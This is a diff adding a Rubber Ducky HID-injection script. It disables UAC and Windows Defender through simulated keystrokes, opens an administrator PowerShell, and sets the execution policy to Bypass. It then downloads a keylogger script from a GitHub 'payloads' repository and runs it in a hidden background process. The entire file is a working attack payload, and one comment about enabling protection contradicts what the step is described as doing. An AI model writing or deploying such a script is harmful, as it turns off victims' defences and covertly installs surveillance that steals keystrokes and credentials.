@@ -1,0 +1,81 @@
+REM Ducky Script to disable Windows Defender and download keylogger kl_script
+ATTACKMODE HID
+REM Title: Disable Defender & Download/Execute Script (Persistent Background)
+REM Author: Zero_Sploit -> B33m0 -> UberGuidoZ -> Kieran Human -> Revised
+REM Description: Disables UAC and Windows Defender, downloads and executes a persistent PowerShell script from GitHub
+REM Target: Windows 10/11 (Powershell)
+REM Version: 2.3
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Disable UAC (by Kieran Human)
+CONTROL ESCAPE
+DELAY 1000
+STRING uac
+DELAY 1000
+ENTER
+DELAY 1000
+DOWNARROW
+DELAY 1000
+DOWNARROW
+DELAY 1000
+DOWNARROW
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+DELAY 1000
+LEFT
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Enable Virus & Threat Protection (by Kieran Human)
+CONTROL ESCAPE
+DELAY 1000
+STRING virus protection
+DELAY 1000
+ENTER
+DELAY 2000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+DELAY 1000
+SPACE
+DELAY 1000
+ALT F4
+
+REM Open PowerShell as Administrator
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT
+DELAY 1000
+
+REM Set execution policy to bypass
+STRING Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+ENTER
+DELAY 500
+
+REM Download PowerShell script from GitHub to temp folder
+STRING New-Item -Path "C:\run" -ItemType Directory -Force; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/absolum24/payloads/main/kl_script.ps1' -OutFile 'C:\run\kl_script.ps1'
+ENTER
+DELAY 1000
+
+REM Execute the script in a new, hidden, and detached process
+STRING Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\run\kl_script.ps1`"" -WindowStyle Hidden
+ENTER
+DELAY 2000
+
+REM Exit the parent PowerShell window
+STRING exit
+ENTER
